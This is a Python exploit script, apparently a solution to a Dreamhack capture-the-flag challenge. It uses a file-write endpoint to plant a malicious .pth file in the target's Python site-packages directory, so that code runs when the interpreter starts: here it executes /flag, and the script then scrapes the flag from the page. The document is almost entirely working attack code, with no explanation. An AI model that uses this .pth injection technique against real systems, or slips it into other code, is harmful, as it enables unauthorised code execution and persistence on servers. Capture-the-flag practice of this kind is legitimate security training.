import requests
import re
class Exploit:
    def __init__(self, baseURL):
        self.baseURL = baseURL.rstrip("/")
        self.data = 'import subprocess; result = subprocess.run(args=["/flag"], capture_output=True, text=True); print(result.stdout)'
        self.file = "/home/dreamhack/.local/lib/python3.10/site-packages/l.pth"
    
    def send_payload(self):
        write_url = f"{self.baseURL}/write"
        params = {
            "data": {self.data},
            "file": {self.file}
        }
        response = requests.get(write_url, params=params)
        print(response.text)
    def get_flag(self):
        response = requests.get(f"{self.baseURL}/")
        if "DH{" in response.text:
            flag = re.search(r"(DH\{.*?\})", response.text)
            if flag:
                print(f"[+] FLAG FOUND: \n{flag.group(1)}")
            else:
                print(f"[-] Failed")

if __name__ == "__main__":
    BASE_URL = "http://host8.dreamhack.games:17300"
    exploit = Exploit(BASE_URL)
    exploit.send_payload()
    exploit.get_flag()